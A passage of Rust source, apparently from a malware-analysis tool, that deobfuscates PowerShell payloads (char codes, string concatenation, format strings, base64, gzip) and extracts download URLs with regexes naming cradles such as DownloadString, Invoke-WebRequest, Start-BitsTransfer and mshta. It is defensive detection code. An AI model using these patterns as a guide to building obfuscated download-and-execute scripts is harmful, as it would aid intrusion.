//! PowerShell payload post-processing: extract URLs and other IOCs from
//! the decoded ps1 content of `env.exec_ps1` / `env.all_extracted_ps1`.
//!
//! Runs our regex-based obfuscation expander over the raw payload, then
//! applies URL-extraction patterns to the simplified source.

#![allow(clippy::items_after_test_module)]

use crate::env::{Environment, FsEntry};
use crate::traits::Trait;
use base64::Engine as _;
use once_cell::sync::Lazy;
use regex::Regex;

// Regex-set patterns. Each capture group #1 is the URL.
// Patterns target common cmdlet/method invocations. Whitespace-tolerant,
// case-insensitive, supports single+double quoted strings.

#[allow(clippy::expect_used)] // regex literals — compile-time constants
static IWR_RE: Lazy<Regex> = Lazy::new(|| {
    // Invoke-WebRequest / iwr / wget / curl (PS alias) — optional -Uri, quoted or unquoted URL
    Regex::new(
        r#"(?i)(?:Invoke-WebRequest|iwr|wget|curl)\b(?:\s+-[A-Za-z][\w-]*)*\s*(?:[^\n|;]*?-Uri(?:\s+|:|=))?\(?\s*["']?((?:https?|ftp|file):[\x2f\x5c]+[^\s"'\);]+)["']?"#
    ).expect("iwr")
});

#[allow(clippy::expect_used)]
static IRM_RE: Lazy<Regex> = Lazy::new(|| {
    // Invoke-RestMethod / irm — optional -Uri, quoted or unquoted URL
    Regex::new(
        r#"(?i)(?:Invoke-RestMethod|irm)\b(?:\s+-[A-Za-z][\w-]*)*\s*(?:[^\n|;]*?-Uri(?:\s+|:|=))?\(?\s*["']?((?:https?|ftp|file):[\x2f\x5c]+[^\s"'\);]+)["']?"#
    ).expect("irm")
});

#[allow(clippy::expect_used)]
static PS_SCHEMELESS_IP_CMDLET_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)(?:Invoke-WebRequest|Invoke-RestMethod|iwr|irm|wget|curl)\b(?:[^\n|;]*?-(?:Uri|Ur)(?:\s+|:|=)|(?:\s+-[A-Za-z][\w-]*)*\s+)(?:['"])?((?:\d{1,3}\.){3}\d{1,3}(?::\d+)?(?:/[^\s"'\);]*)?)(?:['"])?"#,
    )
    .expect("ps schemeless ip cmdlet")
});

#[allow(clippy::expect_used)]
static PS_SCHEMELESS_DOMAIN_CMDLET_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?ix)
            (?: Invoke-WebRequest | Invoke-RestMethod | iwr | irm | wget | curl ) \b
            (?: [^\n|;]*? - (?: Uri | Ur ) (?: \s+ | : | = ) | (?: \s+ -[A-Za-z][\w-]* )* \s+ )
            (?: ['"] )?
            (
                (?: [a-z0-9\-]+ \. ){1,4}
                (?: com | net | org | io | ru | cn | me | info | biz | us | co | ly | gg | tk | xyz
                  | top | life | store | app | tools | rocks | click | stream | host | website
                  | pw | dev | sh | space | site | live | cloud | online | tech | art | news | pro | cc | to )
                / [^\s"'\);<>]{1,200}
            )
            (?: ['"] )?
        "#,
    )
    .expect("ps schemeless domain cmdlet")
});

#[allow(clippy::expect_used)]
static CURL_EXE_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)(?:^|[\s;"'])[\w:./\\-]*curl\.exe\b(?:\s+-[A-Za-z][\w-]*(?:\s+["']?[^"'\s]+["']?)?)*\s+["']?((?:https?|ftp|file):[\x2f\x5c]+[^\s"'\)]+)["']?"#,
    )
    .expect("curl exe")
});

#[allow(clippy::expect_used)]
static MSHTA_URL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)\bmshta(?:\.exe)?\s+["']?((?:https?|ftp|file):[\x2f\x5c]+[^\s"';\)]+)["']?"#)
        .expect("mshta url")
});

#[allow(clippy::expect_used)]
static PS_GENERIC_URL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)\b((?:https?|ftp|file):[\x2f\x5c]+[^\s"'`;,<>\)\]\}]+)"#)
        .expect("ps generic url")
});

#[allow(clippy::expect_used)]
static DOWNLOADSTRING_RE: Lazy<Regex> = Lazy::new(|| {
    // (New-Object Net.WebClient).DownloadString('url') or .DownloadFile('url', 'dst')
    Regex::new(r#"(?i)\.Download(?:String|File|Data)\s*\(\s*["']([^"']+)["']"#).expect("ds")
});

#[allow(clippy::expect_used)]
static BARE_DOWNLOADSTRING_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)\bDownload(?:String|File|Data)\s*\(\s*["']([^"']+)["']"#)
        .expect("bare downloadstring")
});

#[allow(clippy::expect_used)]
static DOWNLOADFILE_CALL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?is)\bDownloadFile\s*\(\s*([^)]{0,2048})\)"#).expect("downloadfile call")
});

#[allow(clippy::expect_used)]
static DOWNLOADSTRING_FRAGMENT_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)\b(?:loadString|ADSTRING)\s*\(\s*'{1,2}(https?://[^'")]+)"#)
        .expect("downloadstring fragment")
});

#[allow(clippy::expect_used)]
static CALLBYNAME_DOWNLOADSTRING_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)CallByname\s*\([^)]*?["']DownloadString["'][^)]*?["'](https?://[^"']+)["']"#)
        .expect("callbyname downloadstring")
});

#[allow(clippy::expect_used)]
static SELF_B64_MATCH_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?is)-match\s*['"]([^'"]{4,200}?)\(\[A-Za-z0-9\+/\=\]\+\)['"]"#)
        .expect("self b64 match regex")
});

#[allow(clippy::expect_used)]
static FILE_B64_XOR_LOADER_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(\d{1,3})\s*;.*?\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*\(\s*(?:gc|Get-Content)\s*['"]([^'"]+)['"]\s*\)\s*-join\s*['"]{2}.*?\[Convert\]::FromBase64String\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\).*?-bxor\s*\$([A-Za-z_][A-Za-z0-9_]*)"#,
    )
    .expect("file b64 xor loader regex")
});

#[allow(clippy::expect_used)]
static START_BITS_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)Start-BitsTransfer\s+(?:[^|]*?-Source\s+)?["']([^"']+)["']"#).expect("bits")
});

#[allow(clippy::expect_used)]
static START_BITS_SCHEMELESS_SOURCE_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?ix)
            Start-BitsTransfer \b
            [^\n|;]*? -S(?:o(?:u(?:r(?:c(?:e)?)?)?)?)? (?: \s+ | : | = )
            (?: ['"] )?
            (
                (?: [a-z0-9\-]+ \. ){1,4}
                (?: com | net | org | io | ru | cn | me | info | biz | us | co | ly | gg | tk | xyz
                  | top | life | store | app | tools | rocks | click | stream | host | website
                  | pw | dev | sh | space | site | live | cloud | online | tech | art | news | pro | cc | to )
                / [^\s"'\);<>]{1,200}
            )
            (?: ['"] )?
        "#,
    )
    .expect("bits schemeless source")
});

#[allow(clippy::expect_used)]
static NET_REQ_RE: Lazy<Regex> = Lazy::new(|| {
    // [Net.WebRequest]::Create('url')  /  [System.Net.WebRequest]::Create('url')
    Regex::new(r#"(?i)\[(?:System\.)?Net\.WebRequest\]::Create\s*\(\s*["']([^"']+)["']"#)
        .expect("netreq")
});

#[allow(clippy::expect_used)]
static DYNAMIC_DOWNLOAD_INVOKE_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\.\s*\(?\s*["'](?:Download(?:String|File|Data)|Down)["']\s*\)?\s*\.Invoke\s*\(\s*(?:\$([A-Za-z_][A-Za-z0-9_]*)|["']([^"']+)["'])"#,
    )
    .expect("dynamic download invoke")
});

#[allow(clippy::expect_used)]
static FOREACH_LITERAL_ARRAY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?is)foreach\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s+in\s+@\(\s*(.*?)\s*\)\s*\)"#)
        .expect("foreach literal array")
});

#[allow(clippy::expect_used)]
static PS_ARRAY_LITERAL_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?is)\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*@\(\s*(.*?)\s*\)"#)
        .expect("ps array literal assignment")
});

#[allow(clippy::expect_used)]
static FOREACH_ARRAY_VAR_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)foreach\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s+in\s+\$([A-Za-z_][A-Za-z0-9_]*)\s*\)"#,
    )
    .expect("foreach array variable")
});

#[allow(clippy::expect_used)]
static PS_QUOTED_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?s)'((?:[^'\\]|\\.)*)'|"((?:[^"\\]|\\.)*)""#).expect("ps quoted literal")
});

#[allow(clippy::expect_used)]
static OUTFILE_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)-Out(?:F(?:ile)?)?(?:\s+|:|=)(?:'([^'\r\n;]+)'?|"([^"\r\n;]+)"?|([^"'\s]+))"#)
        .expect("outfile")
});

#[allow(clippy::expect_used)]
static CURL_OUTPUT_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)(?:^|\s)(?:--output(?:\s+|:|=)|-o\s+)(?:'([^'\r\n;]+)'?|"([^"\r\n;]+)"?|([^"'\s;]+))|(?:^|\s)-[A-Za-z]*o(?:'([^'\r\n;]+)'?|"([^"\r\n;]+)"?|((?:[A-Za-z]:|[\\/])[^"'\s;]+))"#,
    )
    .expect("curl output")
});

#[allow(clippy::expect_used)]
static BITS_DESTINATION_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)-Dest(?:ination)?(?:\s+|:|=)(?:'([^'\r\n;]+)'?|"([^"\r\n;]+)"?|([^"'\s;]+))"#)
        .expect("bits destination")
});

// ---- PowerShell obfuscation expansion pre-pass ----

fn logical_statement_at(text: &str, pos: usize) -> &str {
    let start = text[..pos]
        .rfind(['\r', '\n', ';'])
        .map_or(0, |idx| idx + 1);
    let end = text[pos..]
        .find(['\r', '\n', ';'])
        .map_or(text.len(), |idx| pos + idx);
    text[start..end].trim()
}

fn first_capture_string(caps: regex::Captures<'_>) -> Option<String> {
    (1..caps.len())
        .filter_map(|idx| caps.get(idx).map(|m| m.as_str()))
        .find(|value| !value.is_empty())
        .map(str::to_string)
}

fn outfile_hint_from(text: &str) -> Option<String> {
    OUTFILE_RE
        .captures(text)
        .or_else(|| CURL_OUTPUT_RE.captures(text))
        .or_else(|| BITS_DESTINATION_RE.captures(text))
        .and_then(first_capture_string)
}

#[allow(clippy::expect_used)]
static CHAR_CONCAT_RE: Lazy<Regex> = Lazy::new(|| {
    // Must have at least two + separators (3+ [char] terms) to avoid matching plain [char]N
    Regex::new(r"(?i)(?:\[char\]\s*\(?\s*(?:0x[0-9a-f]+|\d+)(?:\s*[+-]\s*(?:0x[0-9a-f]+|\d+))*\s*\)?\s*\+\s*){2,}\[char\]\s*\(?\s*(?:0x[0-9a-f]+|\d+)(?:\s*[+-]\s*(?:0x[0-9a-f]+|\d+))*\s*\)?")
        .expect("char concat regex")
});

#[allow(clippy::expect_used)]
static CHAR_INNER_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r"(?i)\[char\]\s*\(?\s*((?:0x[0-9a-f]+|\d+)(?:\s*[+-]\s*(?:0x[0-9a-f]+|\d+))*)\s*\)?",
    )
    .expect("inner char regex")
});

#[allow(clippy::expect_used)]
static CHAR_LITERAL_CONCAT_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\[char\]\s*\(?\s*((?:0x[0-9a-f]+|\d+)(?:\s*[+-]\s*(?:0x[0-9a-f]+|\d+))*)\s*\)?\s*\+\s*(?:'((?:''|[^'])*)'|"([^"`$\\]*(?:\\.[^"`$\\]*)*)")"#,
    )
    .expect("char literal concat regex")
});

fn expand_char_concat(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = CHAR_CONCAT_RE
        .find_iter(text)
        .filter_map(|m| {
            let s = m.as_str();
            let mut chars = Vec::new();
            // Inner regex to extract each [char]N value
            for cap in CHAR_INNER_RE.captures_iter(s) {
                let n = parse_ps_char_codepoint(cap.get(1)?.as_str())?;
                if let Some(c) = char::from_u32(n) {
                    chars.push(c);
                }
            }
            let s_out: String = chars.into_iter().collect();
            Some((m.start(), m.end(), format!("'{}'", s_out)))
        })
        .collect();
    let mut result = text.to_string();
    // Apply replacements in reverse so byte offsets stay valid
    for (start, end, replacement) in matches.into_iter().rev() {
        result.replace_range(start..end, &replacement);
    }
    result
}

fn expand_char_literal_concat(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = CHAR_LITERAL_CONCAT_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let ch = char::from_u32(parse_ps_char_codepoint(caps.get(1)?.as_str())?)?;
            let literal = caps
                .get(2)
                .map(|m| m.as_str().replace("''", "'"))
                .or_else(|| caps.get(3).map(|m| m.as_str().to_string()))?;
            let value = format!("{ch}{literal}").replace('\'', "''");
            Some((full.start(), full.end(), format!("'{value}'")))
        })
        .collect();
    let mut result = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        result.replace_range(start..end, &replacement);
    }
    result
}

fn parse_ps_char_codepoint(expr: &str) -> Option<u32> {
    let expr = expr.trim();
    if expr.is_empty() {
        return None;
    }
    if let Some(value) = parse_ps_char_codepoint_atom(expr) {
        return Some(value);
    }

    let mut acc = 0i64;
    let mut sign = 1i64;
    let mut start = 0usize;
    let mut saw_operator = false;
    let mut saw_term = false;
    let bytes = expr.as_bytes();
    let mut i = 0usize;
    while i < bytes.len() {
        match bytes[i] {
            b'+' | b'-' => {
                let term = expr[start..i].trim();
                if term.is_empty() {
                    if !saw_term {
                        sign = if bytes[i] == b'-' { -1 } else { 1 };
                        start = i + 1;
                        i += 1;
                        continue;
                    }
                    return None;
                }
                acc += sign * i64::from(parse_ps_char_codepoint_atom(term)?);
                saw_term = true;
                saw_operator = true;
                sign = if bytes[i] == b'-' { -1 } else { 1 };
                start = i + 1;
            }
            _ => {}
        }
        i += 1;
    }
    let term = expr[start..].trim();
    if term.is_empty() {
        return None;
    }
    acc += sign * i64::from(parse_ps_char_codepoint_atom(term)?);
    if saw_operator && (0..=i64::from(u32::MAX)).contains(&acc) {
        Some(acc as u32)
    } else {
        None
    }
}

fn parse_ps_char_codepoint_atom(expr: &str) -> Option<u32> {
    let expr = expr.trim();
    if let Some(stripped) = expr.strip_prefix("0x").or_else(|| expr.strip_prefix("0X")) {
        u32::from_str_radix(stripped, 16).ok()
    } else {
        expr.parse().ok()
    }
}

#[allow(clippy::expect_used)]
static STR_CONCAT_RE: Lazy<Regex> = Lazy::new(|| {
    // Match runs of (quoted-string + )+ quoted-string.
    Regex::new(r#"(?:'(?:[^'\\]|\\.)*'\s*\+\s*)+'(?:[^'\\]|\\.)*'"#).expect("str concat regex")
});

#[allow(clippy::expect_used)]
static STR_PART_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r#"'((?:[^'\\]|\\.)*)'"#).expect("string part regex"));

fn expand_string_concat(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = STR_CONCAT_RE
        .find_iter(text)
        .filter_map(|m| {
            if !is_string_concat_start(text, m.start()) {
                return None;
            }
            let s = m.as_str();
            let mut combined = String::new();
            for cap in STR_PART_RE.captures_iter(s) {
                let part_str = cap.get(1)?.as_str();
                combined.push_str(part_str);
            }
            Some((m.start(), m.end(), format!("'{}'", combined)))
        })
        .collect();
    let mut result = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        result.replace_range(start..end, &replacement);
    }
    result
}

#[allow(clippy::expect_used)]
static DQ_STR_CONCAT_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?:\"(?:[^\"\\]|\\.)*\"\s*\+\s*)+\"(?:[^\"\\]|\\.)*\""#)
        .expect("double quoted str concat regex")
});

#[allow(clippy::expect_used)]
static DQ_STR_PART_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r#"\"((?:[^\"\\]|\\.)*)\""#).expect("double string part regex"));

fn expand_double_string_concat(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = DQ_STR_CONCAT_RE
        .find_iter(text)
        .filter_map(|m| {
            if !is_string_concat_start(text, m.start()) {
                return None;
            }
            let s = m.as_str();
            let mut combined = String::new();
            for cap in DQ_STR_PART_RE.captures_iter(s) {
                combined.push_str(cap.get(1)?.as_str());
            }
            Some((m.start(), m.end(), format!("'{}'", combined)))
        })
        .collect();
    let mut result = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        result.replace_range(start..end, &replacement);
    }
    result
}

fn is_string_concat_start(text: &str, pos: usize) -> bool {
    match previous_non_whitespace(text, pos) {
        None => true,
        Some(c) => matches!(c, '=' | '(' | '[' | '{' | ',' | ';' | ':' | '?' | '+'),
    }
}

#[allow(clippy::expect_used)]
static DOUBLED_QUOTE_LITERAL_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r#"''([^'\r\n]{1,8192})''"#).expect("doubled quote literal"));

fn expand_doubled_quote_literals(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = DOUBLED_QUOTE_LITERAL_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let inner = caps.get(1)?.as_str();
            Some((full.start(), full.end(), format!("'{inner}'")))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[allow(clippy::expect_used)]
static FORMAT_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"\(?\s*(?:'([^']*)'|"([^"]*)")\s*\)?\s*-f\s*((?:(?:'[^']*'|"[^"]*")\s*,\s*)*(?:'[^']*'|"[^"]*"))"#,
    )
        .expect("format literal")
});

#[allow(clippy::expect_used)]
static FORMAT_CONCAT_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"\(?\s*((?:'[^']*'\s*\+\s*)+'[^']*')\s*\)?\s*-f\s*((?:'[^']*'\s*,\s*)*'[^']*')"#)
        .expect("format concat literal")
});

#[allow(clippy::expect_used)]
static FORMAT_ARG_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r#"'([^']*)'|"([^"]*)""#).expect("format arg literal"));

#[allow(clippy::expect_used)]
static STRING_FORMAT_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\[(?:System\.)?String\]::Format\s*\(\s*(?:'([^']*)'|"([^"]*)")\s*,\s*((?:(?:'[^']*'|"[^"]*")\s*,\s*)*(?:'[^']*'|"[^"]*"))\s*\)"#,
    )
    .expect("string format")
});

fn expand_format_literals(text: &str) -> String {
    let concat_matches: Vec<(usize, usize, String)> = FORMAT_CONCAT_LITERAL_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let template_parts = caps.get(1)?.as_str();
            let mut template = String::new();
            for part in STR_PART_RE.captures_iter(template_parts) {
                template.push_str(part.get(1)?.as_str());
            }
            let args = caps.get(2)?.as_str();
            Some((
                full.start(),
                full.end(),
                format_format_literal(template, args)?,
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in concat_matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }

    let matches: Vec<(usize, usize, String)> = FORMAT_LITERAL_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let template = caps
                .get(1)
                .or_else(|| caps.get(2))
                .map(|m| m.as_str().to_string())?;
            let args = caps.get(3)?.as_str();
            let before = text[..full.start()].trim_end();
            if before.ends_with('+') {
                return None;
            }
            Some((
                full.start(),
                full.end(),
                format_format_literal(template, args)?,
            ))
        })
        .collect();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn format_format_literal(template: String, args: &str) -> Option<String> {
    let template = format_format_literal_value(template, args)?;
    Some(format!("'{}'", template))
}

fn format_format_literal_value(mut template: String, args: &str) -> Option<String> {
    let mut arg_count = 0usize;
    for (idx, part) in FORMAT_ARG_RE.captures_iter(args).enumerate() {
        arg_count += 1;
        if arg_count > 128 {
            return None;
        }
        let value = part.get(1).or_else(|| part.get(2))?.as_str();
        template = template.replace(&format!("{{{idx}}}"), value);
        if template.len() > 8192 {
            return None;
        }
    }
    Some(template)
}

fn expand_ps_string_format_static(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = STRING_FORMAT_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let template = caps.get(1).or_else(|| caps.get(2))?.as_str();
            if template.len() > 8192 {
                return None;
            }
            let args = caps.get(3)?.as_str();
            let formatted = format_format_literal_value(template.to_string(), args)?;
            Some((
                full.start(),
                full.end(),
                format!("'{}'", formatted.replace('\'', "''")),
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[allow(clippy::expect_used)]
static B64_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*['"]([A-Za-z0-9+/=]+)['"]\s*\)"#,
    )
    .expect("b64 literal regex")
});

#[allow(clippy::expect_used)]
static GETSTRING_B64_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\[(?:System\.)?(?:Text\.)?Encoding\]::(UTF8|ASCII|Unicode|UTF7|BigEndianUnicode|UTF32)\.GetString\s*\(\s*\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*\(*\s*['"]([A-Za-z0-9+/=\s]+)['"]\s*(?:\.\s*Trim(?:Start|End)?\s*\(\s*\))?\s*\)*\s*\)\s*\)"#,
    )
    .expect("getstring b64 literal regex")
});

#[allow(clippy::expect_used)]
static GETSTRING_B64_VAR_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\[(?:System\.)?(?:Text\.)?Encoding\]::(UTF8|ASCII|Unicode|UTF7|BigEndianUnicode|UTF32)\.GetString\s*\(\s*\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*\(*\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\.\s*Trim(?:Start|End)?\s*\(\s*\))?\s*\)*\s*\)\s*\)"#,
    )
    .expect("getstring b64 var regex")
});

#[allow(clippy::expect_used)]
static GETSTRING_BYTE_ARRAY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\[(?:System\.)?(?:Text\.)?Encoding\]::(UTF8|ASCII|Unicode|UTF7|BigEndianUnicode|UTF32)\.GetString\s*\(\s*\[\s*byte\s*\[\]\s*\]\s*@?\(\s*((?:0x[0-9a-f]+|\d+)\s*(?:,\s*(?:0x[0-9a-f]+|\d+)\s*){3,})\)\s*\)"#,
    )
    .expect("getstring byte array regex")
});

#[allow(clippy::expect_used)]
static FROMB64_LONG_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)FromBase64String\s*\(\s*['"]([A-Za-z0-9+/=]{40,})['"]"#)
        .expect("long frombase64 literal regex")
});

#[allow(clippy::expect_used)]
static GZIP_B64_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*\(*\s*['"]([A-Za-z0-9+/=]+)['"]\s*\)*\s*\)"#,
    )
    .expect("gzip b64 literal regex")
});

#[allow(clippy::expect_used)]
static PS_LONG_B64_VAR_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?is)\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*["']([A-Za-z0-9+/=]{256,})["']"#)
        .expect("ps long b64 var assign regex")
});

#[allow(clippy::expect_used)]
static PS_FUNCTION_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)\bfunction\s+([A-Za-z_][A-Za-z0-9_]*)\b"#).expect("ps function def regex")
});

#[allow(clippy::expect_used)]
static PS_GZIP_FUNCTION_GETSTRING_VAR_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*\[(?:System\.)?(?:Text\.)?Encoding\]::(?:UTF8|ASCII|Unicode|UTF7|BigEndianUnicode|UTF32)\.GetString\s*\(\s*\(*\s*([A-Za-z_][A-Za-z0-9_]*)\s*\(\s*\(*\s*\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)\s*\)*\s*\)\s*\)*\s*\)\s*(?:\.TrimEnd\s*\([^)]*\))?"#,
    )
    .expect("ps gzip function getstring var regex")
});

#[allow(clippy::expect_used)]
static READ_TO_END_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r#"(?i)\.ReadToEnd\s*\(\s*\)"#).expect("readtoend regex"));

#[allow(clippy::expect_used)]
static JSON_SCRIPT_B64_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*\(\s*'\{[^']*"Script"\s*:\s*"([A-Za-z0-9+/=]+)"[^']*\}'\s*\|\s*ConvertFrom-Json\s*\)\.Script\s*\)"#,
    )
    .expect("json script b64 regex")
});

#[derive(Clone, Copy)]
enum PsCompressionStream {
    Gzip,
    Deflate,
}

fn expand_gzip_base64_literals(text: &str) -> String {
    let lower = text.to_ascii_lowercase();
    if !lower.contains("gzipstream") && !lower.contains("deflatestream") {
        return text.to_string();
    }

    let matches: Vec<(usize, usize, String)> = GZIP_B64_LITERAL_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let b64 = caps.get(1)?.as_str();
            let decoded = base64::engine::general_purpose::STANDARD.decode(b64).ok()?;
            let (start, end, stream) = compression_wrapper_bounds(text, full.start(), full.end())
                .unwrap_or_else(|| {
                    let stream = if lower.contains("deflatestream") {
                        PsCompressionStream::Deflate
                    } else {
                        PsCompressionStream::Gzip
                    };
                    (full.start(), full.end(), stream)
                });
            let inflated = decompress_ps_stream(&decoded, stream, 2 * 1024 * 1024)?;
            let s = decode_payload(&inflated).into_owned().replace('\'', "''");
            Some((start, end, format!("'{s}'")))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn decompress_ps_stream(
    bytes: &[u8],
    stream: PsCompressionStream,
    max_bytes: usize,
) -> Option<Vec<u8>> {
    use std::io::Read as _;

    match stream {
        PsCompressionStream::Gzip => crate::aes_chain::crypto::gunzip(bytes, max_bytes).ok(),
        PsCompressionStream::Deflate => {
            let mut decoder = flate2::read::DeflateDecoder::new(bytes);
            let mut out = Vec::new();
            std::io::Read::take(&mut decoder, max_bytes.saturating_add(1) as u64)
                .read_to_end(&mut out)
                .ok()?;
            if out.len() > max_bytes {
                return None;
            }
            Some(out)
        }
    }
}

fn expand_gzip_function_base64_variables(text: &str) -> String {
    let lower = text.to_ascii_lowercase();
    if (!lower.contains("gzipstream") && !lower.contains("deflatestream"))
        || !lower.contains("frombase64string")
    {
        return text.to_string();
    }

    let mut b64_vars = std::collections::HashMap::new();
    for caps in PS_LONG_B64_VAR_ASSIGN_RE.captures_iter(text).take(32) {
        let Some(name) = caps.get(1) else { continue };
        let Some(value) = caps.get(2) else { continue };
        if value.as_str().len() <= 2 * 1024 * 1024 {
            b64_vars.insert(name.as_str().to_ascii_lowercase(), value.as_str());
        }
    }
    if b64_vars.is_empty() {
        return text.to_string();
    }

    let mut compression_functions = std::collections::HashMap::new();
    for caps in PS_FUNCTION_DEF_RE.captures_iter(text) {
        let Some(full) = caps.get(0) else { continue };
        let Some(name) = caps.get(1) else { continue };
        let body_end = text.len().min(full.end().saturating_add(4096));
        let body = text[full.end()..body_end].to_ascii_lowercase();
        if body.contains("gzipstream") {
            compression_functions.insert(
                name.as_str().to_ascii_lowercase(),
                PsCompressionStream::Gzip,
            );
        } else if body.contains("deflatestream") {
            compression_functions.insert(
                name.as_str().to_ascii_lowercase(),
                PsCompressionStream::Deflate,
            );
        }
    }
    if compression_functions.is_empty() {
        return text.to_string();
    }

    let matches: Vec<(usize, usize, String)> = PS_GZIP_FUNCTION_GETSTRING_VAR_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let out_var = caps.get(1)?.as_str();
            let function_name = caps.get(2)?.as_str().to_ascii_lowercase();
            let stream = *compression_functions.get(&function_name)?;
            let b64_var = caps.get(3)?.as_str().to_ascii_lowercase();
            let b64 = b64_vars.get(&b64_var)?;
            let decoded = base64::engine::general_purpose::STANDARD.decode(b64).ok()?;
            let inflated = decompress_ps_stream(&decoded, stream, 4 * 1024 * 1024)?;
            let s = decode_payload(&inflated).into_owned().replace('\'', "''");
            Some((full.start(), full.end(), format!("${out_var} = '{s}'")))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn compression_wrapper_bounds(
    text: &str,
    b64_start: usize,
    b64_end: usize,
) -> Option<(usize, usize, PsCompressionStream)> {
    let lower = text.to_ascii_lowercase();
    let start = lower[..b64_start].rfind("new-object system.io.streamreader")?;
    let after = &text[b64_end..text.len().min(b64_end.saturating_add(8192))];
    let read_to_end = READ_TO_END_RE.find(after)?;
    let end = b64_end + read_to_end.end();
    let wrapper = &lower[start..end];
    if !wrapper.contains("memorystream") {
        return None;
    }
